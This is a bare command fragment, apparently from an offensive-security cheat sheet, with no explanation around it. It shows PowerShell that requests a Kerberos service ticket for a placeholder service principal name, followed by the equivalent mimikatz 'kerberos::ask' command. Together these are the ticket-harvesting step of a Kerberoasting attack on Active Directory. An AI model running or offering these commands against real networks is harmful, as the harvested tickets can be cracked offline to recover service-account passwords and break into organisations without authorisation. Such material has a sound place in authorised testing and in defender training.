	>Add-Type -AssemblyName System.IdentityModel
	>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
	&
	>kerberos::ask /target:SPN
